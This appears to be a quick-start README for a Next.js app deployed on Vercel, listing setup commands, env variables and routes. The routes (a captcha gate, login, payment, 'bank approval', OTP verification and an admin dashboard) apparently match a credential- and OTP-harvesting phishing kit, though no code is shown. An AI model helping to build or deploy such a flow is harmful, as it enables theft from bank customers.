# Quick Start - Next.js + Vercel

## TL;DR - Get Running in 5 Minutes

### Local Development
```bash
# 1. Install
pnpm install

# 2. Setup env
cp .env.example .env.local
# Edit .env.local with your settings

# 3. Run
pnpm dev

# Visit http://localhost:3000
```

### Deploy to Vercel
```bash
# 1. Push code
git push origin main

# 2. Go to vercel.com → Import Project

# 3. Set env vars (from .env.local)

# 4. Deploy
```

## Environment Variables (Required)

```
OAUTH_SERVER_URL=https://api.manus.im
VITE_APP_ID=your_app_id
VITE_OAUTH_PORTAL_URL=https://manus.im
OWNER_OPEN_ID=your_owner_id
JWT_SECRET=your_secret_32_chars_or_more
DATABASE_URL=mysql://user:pass@host:3306/db
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

## Common Commands

```bash
pnpm dev              # Start dev server
pnpm build            # Build for production
pnpm start            # Run production build
pnpm check            # Type check
pnpm db:push          # Run database migrations
```

## Project Structure

```
app/                  # Next.js App Router (React pages)
├── api/              # API routes
├── lib/              # Utilities & contexts
├── login/            # /login page
├── payment/          # /payment page
├── admin/            # /admin page
└── page.tsx          # / (home/captcha)

server/               # Backend logic (unchanged)
├── routers.ts        # tRPC endpoints
└── _core/            # Core services

middleware.ts         # Captcha guard
vercel.json          # Vercel config
```

## Routes

| Route | Purpose |
|-------|---------|
| `/` | Captcha verification |
| `/login` | Login form |
| `/payment` | Payment processing |
| `/bank-app` | Bank approval |
| `/otp` | OTP verification |
| `/admin` | Admin dashboard |
| `/api/trpc/*` | API endpoints |

## Troubleshooting

**Port in use?**
```bash
PORT=3001 pnpm dev
```

**Database error?**
- Check DATABASE_URL in .env.local
- Ensure MySQL is running

**OAuth error?**
- Check OAUTH_SERVER_URL and VITE_APP_ID

**Build fails on Vercel?**
- Check all env vars are set in Vercel dashboard

## Documentation

- **[README.md](./README.md)** - Full project info
- **[DEPLOYMENT.md](./DEPLOYMENT.md)** - Detailed Vercel deployment
- **[MIGRATION.md](./MIGRATION.md)** - Technical migration details
- **[MIGRATION_SUMMARY.md](./MIGRATION_SUMMARY.md)** - What changed
- **[CHANGES.md](./CHANGES.md)** - Complete file changes list

## Technology

- **Next.js 15** - React framework
- **Tailwind CSS 4** - Styling
- **tRPC** - Type-safe APIs
- **Drizzle ORM** - Database
- **Vercel** - Hosting

---

**Need more help?** Check the documentation files listed above.
